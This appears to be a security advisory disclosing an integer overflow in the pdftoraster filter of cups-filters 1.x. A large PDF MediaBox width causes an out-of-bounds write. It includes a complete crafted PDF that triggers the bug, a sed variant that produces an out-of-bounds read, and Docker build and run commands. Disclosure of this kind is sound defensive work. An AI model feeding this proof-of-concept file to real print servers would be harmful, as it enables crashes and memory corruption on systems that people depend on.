Description

  

    
We are tracking this issue with the public ID BIGSLEEP-434615384. Please use this identifier for reference in any future communication.

Vulnerability Details

By crafting a PDF file with a large MediaBox value, an attacker can cause CUPS-Filter 1.x’s pdftoraster tool to write beyond the bounds of an array.

A PDF with a large MediaBox width value causes header.cupsWidth to become large.

The calculation of bytesPerLine = (header.cupsBitsPerPixel * header.cupsWidth + 7) / 8 overflows, resulting in a small value. (code)

lineBuf is allocated with the small bytesPerLine size. (code)

convertLineChunked calls writePixel8, which attempts to write to lineBuf outside of its buffer size (out of bounds write)

Affected Version(s)

The issue has been reproduced in cups-filters 1.x, as of 2025-07-28:

Library
Commit
Date
Message

cups-filters 1.x
c3d2f07
2025-07-10
1.x: Fix NULL-pointer dereference when parsing %%PDFTOPDF comments (#644)

In libcupsfilters, we found the same bytesPerLine multiplication without overflow check (code), but the provided test case does not cause an overflow there, because the values are different.

Reproduction

We reproduce the issue with an AddressSanitizer-enabled build and a crafted PDF file.

Test Case

%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Count 1/Kids[3 0 R]>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 171798692 72]/Contents 4 0 R>>endobj
4 0 obj<</Length 0>>stream
endstream
endobj
xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000054 00000 n
0000000101 00000 n
0000000184 00000 n
trailer<</Size 5/Root 1 0 R>>
startxref
228
%EOF

Remark: The MediaBox width value 171798692 is chosen to reproduce the out of bounds write. Other high MediaBox values will either reproduce the out of bounds write, or a related out of bounds read.  A file that reproduces the out of bounds read scenario can be built using:

cat repro.pdf | sed -e s/171798692/999999/g > repro-oobr.pdf

Build Instructions

CUPS-Filters 1.x has to be built with AddressSanitizer.

For easier reproduction, this Dockerfile creates a Docker container where the newest version of CUPS-Filters 1.x is compiled and installed with AddressSanitizer:

FROM ubuntu:noble
RUN apt-get update && apt-get install -y make autoconf automake libtool build-essential git

RUN apt update && apt-get install --no-install-recommends -y chrpath gnutls-dev libavahi-common-dev libavahi-client-dev autopoint gettext libcups2-dev ghostscript mupdf-tools libqpdf-dev libfontconfig-dev liblcms-dev libexif-dev libglib2.0-dev libqpdf-dev libpoppler-cpp-dev poppler-utils libavahi-glib-dev

RUN mkdir /build
WORKDIR /build
RUN git clone --depth 1 --branch 1.x https://github.com/OpenPrinting/cups-filters.git

ENV LD="clang++"
ENV CFLAGS="-fsanitize=address -O0 -g"
ENV CXXFLAGS="-fsanitize=address -O0 -g"
ENV LDFLAGS="-fsanitize=address -lstdc++ -Wl,--allow-multiple-definition"

WORKDIR /build/cups-filters
RUN ./autogen.sh
RUN ./configure --enable-static --disable-shared
RUN make -j$(nproc)
RUN make install

You can build it with:

docker build -t cups-filters-1.x-asan:v1.0 -f Dockerfile .

Alternatively, you can use the equivalent build steps on a regular Linux system.

Command

The crash can be reproduced with the following command:

export ASAN_OPTIONS=alloc_dealloc_mismatch=0
/usr/lib/cups/filter/pdftoraster 0 username title 1 '' < repro.pdf

Remark: The environment variable ASAN_OPTIONS=alloc_dealloc_mismatch=0 suppresses a report about a memory allocation bug in glib, which is installed through a Debian package, which would otherwise shadow the CUPS-Filters bug.

When calling from outside of Docker, this is the equivalent command:

docker run \
  --interactive \
  --env=ASAN_OPTIONS=alloc_dealloc_mismatch=0 \
  cups-filters-1.x-asan:v1.0 \
  /usr/lib/cups/filter/pdftoraster 0 username title 1 '' \
  < repro.pdf
